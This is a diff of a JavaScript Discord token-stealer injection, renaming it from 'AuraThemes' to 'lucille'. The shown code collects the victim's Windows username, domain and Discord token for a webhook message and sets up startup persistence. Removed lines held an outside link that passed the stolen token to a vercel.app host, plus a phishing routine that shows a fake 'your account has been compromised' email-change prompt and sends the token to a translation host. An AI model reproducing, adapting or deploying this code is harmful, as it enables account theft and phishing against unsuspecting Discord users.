@@ -245,12 +245,12 @@ const notify = async (ctx, token, user) => {
     ];
 
     ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
-    ctx.username = `AuraThemes - injection`;
-    ctx.avatar_url = `https://i.imgur.com/CeFqJOc.gif`;
+    ctx.username = `lucille`;
+    ctx.avatar_url = `https://i.imgur.com/4YzNirT.jpeg`;
 
     ctx.embeds[0].fields.unshift({
         name: `<a:hearts:1176516454540116090> Token:`,
-        value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
+        value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](${token})`,
         inline: false
     })
 
@@ -717,7 +717,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
 };
 
 const startup = async () => {
-    const startupDir = path.join(__dirname, 'aurathemes');
+    const startupDir = path.join(__dirname, 'lucille');
 
     const {
         token,
@@ -836,40 +836,6 @@ const startup = async () => {
         fs.writeFileSync(startupScriptRunJsFile, scriptRunJsFileContent.replace(/\\/g, '\\\\'));
     }
 
-};
-
-const translateEmailUpdate = async (token, locale) => {
-    const message = [
-        "User Settings",
-        "Edit email address",
-        "We have detected something unusual with your (<strong>Discord</strong>) account, your address,",
-        "has been compromised.",
-        "Please change it to continue using your account.",
-        "No longer have access to your email",
-        "Contact your email provider to fix it.",
-    ];
-
-    const sanitized = message.map(item => item.replace(/[.,]/g, ''));
-
-    try {
-        const textParam = encodeURIComponent(JSON.stringify(sanitized));
-        const response = parseJSON(await request('GET', `https://translate.w1sh.xyz/translate?key=K4ITRUN_IS_GOD&text=${textParam}&language=${locale}`, {
-            'Content-Type': 'application/json',
-            'Authorization': token
-        }));
-
-        if (!response.success) {
-            return message;
-        }
-
-        const translatedText = parseJSON(response.text);
-
-        return Array.isArray(translatedText) && translatedText.length === message.length
-            ? translatedText
-            : message;
-    } catch (error) {
-        return message;
-    }
 };
 
 let [
